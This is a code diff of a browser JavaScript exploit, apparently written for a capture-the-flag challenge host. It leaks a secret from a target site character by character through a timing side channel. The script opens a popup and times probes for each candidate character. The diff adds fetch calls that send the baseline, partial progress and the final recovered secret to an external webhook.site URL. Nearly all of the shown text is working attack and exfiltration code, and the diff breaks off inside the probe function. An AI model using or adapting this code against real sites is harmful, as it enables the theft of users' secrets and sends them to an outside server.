@@ -5,30 +5,38 @@
 const TARGET = "https://svfgp.breakable.live/";
 const WEBHOOK = "https://webhook.site/a1531501-a3f0-4a05-b558-b492727a4089?secret=";
 const CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}";
-const THRESHOLD = 300; // ms
+const THRESHOLD = 300; // adjust based on observed baseline
 
-let win = open('about:blank', '_blank');
-if (!win) { document.body.innerText = 'Popup blocked!'; throw ''; }
+let win = window.open('about:blank', '_blank');
+if (!win) {
+  fetch(WEBHOOK + "popup_blocked", {mode: 'no-cors'});
+  document.body.innerText = 'Popup blocked';
+  throw '';
+}
 
 setTimeout(async () => {
-  let secret = '';
   let baseline = await test('~');
+  fetch(WEBHOOK + "baseline=" + baseline, {mode: 'no-cors'});
+
+  let secret = '';
   while (true) {
     let best = '', bestTime = 0;
     for (let c of CHARSET) {
       let time = await test(secret + c);
       if (time > bestTime) { bestTime = time; best = c; }
     }
-    if (bestTime > baseline + THRESHOLD) secret += best;
-    else break;
+    if (bestTime > baseline + THRESHOLD) {
+      secret += best;
+      fetch(WEBHOOK + "progress=" + secret, {mode: 'no-cors'});
+    } else break;
   }
-  new Image().src = WEBHOOK + secret;
+  fetch(WEBHOOK + encodeURIComponent(secret), {mode: 'no-cors'});
   document.body.innerText = 'Secret: ' + secret;
 }, 500);
 
 function test(q) {
   return new Promise(r => {
-    let rid = Math.random();
+    let rid = Math.random().toString(36).substring(2);
     let start = performance.now();
     function handler(e) {
       if (e.data.type === 'svfgp-probe-done' && e.data.rid === rid) {
